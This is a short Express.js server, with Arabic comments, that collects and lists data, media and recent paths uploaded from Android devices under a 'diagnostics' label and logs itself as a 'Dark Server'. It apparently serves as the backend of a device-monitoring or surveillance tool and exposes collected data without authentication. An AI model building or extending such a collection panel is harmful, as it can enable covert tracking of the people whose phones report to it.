const express = require('express');
const app = express();
app.use(express.json({ limit: '50mb' }));

// قاعدة بيانات مؤقتة لتخزين الأجهزة وبياناتها
let devicesData = {};

// استقبال البيانات والميديا والمسارات الحديثة من أجهزة الأندرويد
app.post('/api/upload', (req, res) => {
    const { deviceId, section, items, model, osVersion, battery } = req.body;
    if (!deviceId) return res.status(400).json({ error: "Missing deviceId" });

    if (!devicesData[deviceId]) {
        devicesData[deviceId] = {
            id: deviceId,
            status: "online",
            model: model || "Android Device",
            osVersion: osVersion || "Unknown",
            battery: battery || 100,
            diagnostics: {}
        };
    }

    if (section) {
        devicesData[deviceId].diagnostics[section] = { items: items || [] };
    }
    
    res.json({ status: "success", message: "Data synced successfully" });
});

// جلب قائمة الأجهزة المتصلة
app.get('/api/devices', (req, res) => {
    const list = Object.values(devicesData);
    res.json({ devices: list });
});

// جلب تفاصيل الأقسام والمسارات لجهاز معين
app.get('/api/diagnostics/:id', (req, res) => {
    const dev = devicesData[req.params.id];
    if (!dev) return res.status(404).json({ error: "Device not found" });
    res.json({ diagnostics: dev.diagnostics });
});

// حذف الجهاز من القائمة
app.delete('/api/devices/:id', (req, res) => {
    const id = req.params.id;
    if (devicesData[id]) {
        delete devicesData[id];
        return res.json({ status: "deleted" });
    }
    res.status(404).json({ error: "Device not found" });
});

app.listen(3000, () => console.log('Dark Server running on port 3000'));
